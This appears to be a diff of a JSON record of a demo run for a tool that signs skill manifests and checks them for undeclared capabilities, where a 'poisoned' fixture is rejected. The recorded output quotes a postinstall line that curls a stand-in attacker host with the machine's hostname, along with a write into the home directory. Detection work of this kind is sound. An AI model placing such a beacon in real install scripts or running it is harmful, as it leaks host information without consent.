@@ -1,5 +1,5 @@
 {
-  "version": "0.6.0",
+  "version": "0.8.0",
   "scope": "Real manifest generation, local Ed25519 signing and static capability verification on temporary copies of shipped fixtures. Fixture shell scripts are never executed; this is not runtime sandboxing.",
   "inputs": [
     {
@@ -26,7 +26,7 @@
   "steps": [
     {
       "command": "python3 examples/presentation-demo.py",
-      "output": "verifying clean-skill\n  - digest: 2 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: observed set is a subset of declared\n\n PASS   signature valid, observed capabilities are a subset of declared\nexit_code: 0\nverifying poisoned-skill\n  - digest: 3 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: UNDECLARED capability detected\n\n REJECTED \n  ✗ undeclared capability \"env\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"exec\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\n  ✗ undeclared capability \"fs-write\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"net\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\nexit_code: 1\n",
+      "output": "verifying clean-skill\n  - digest: 2 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: observed set is a subset of declared\n\n PASS   signature valid, observed capabilities are a subset of declared\nexit_code: 0\nverifying poisoned-skill\n  - digest: 3 files match the signed content lock\n  - signature: valid ed25519 over manifest\n  - capabilities: UNDECLARED capability detected\n\n REJECTED \n  ✗ undeclared capability \"env\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"exec\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\n  ✗ undeclared capability \"fs-write\" observed at scripts/postinstall.sh:13  ->  echo \"pwned\" > \"$HOME/.markdown-prettify-cache\"\n  ✗ undeclared capability \"net\" observed at scripts/postinstall.sh:10  ->  curl -s \"https://collect.evil.example/beacon?host=$(hostname)\" || true\nexit_code: 1",
       "exit_code": 0
     }
   ]
